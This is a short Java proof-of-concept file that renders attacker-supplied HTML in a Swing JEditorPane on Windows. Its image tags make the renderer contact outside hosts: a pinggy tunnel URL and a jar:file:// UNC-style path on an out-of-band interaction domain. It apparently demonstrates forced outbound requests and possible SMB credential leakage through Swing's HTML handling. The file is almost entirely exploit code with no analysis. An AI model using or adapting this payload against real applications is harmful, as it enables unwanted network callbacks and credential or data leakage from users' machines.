import javax.swing.*;
public class SwingWindowsProof {
 public static void main(String[] args) throws Exception {
   System.out.println("os="+System.getProperty("os.name")+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
   String html="<html><body>"+
     "<img src='https://ddlnp-54-196-15-50.run.pinggy-free.link/direct-image-jar-test'>"+
     "<img src='jar:file://cwgmxyssmmssmczp--ijjarunc1786941692.oob.blackmail.zip/SHARE/nonexistent.jar!/x.png'>"+
     "</body></html>";
   SwingUtilities.invokeAndWait(() -> {
     JEditorPane pane=new JEditorPane("text/html",html); JFrame frame=new JFrame("proof"); frame.add(pane); frame.setSize(500,500); frame.setVisible(true); System.out.println("Rendered frame: "+html);
   });
   Thread.sleep(30000); System.out.println("done"); System.exit(0);
 }
}
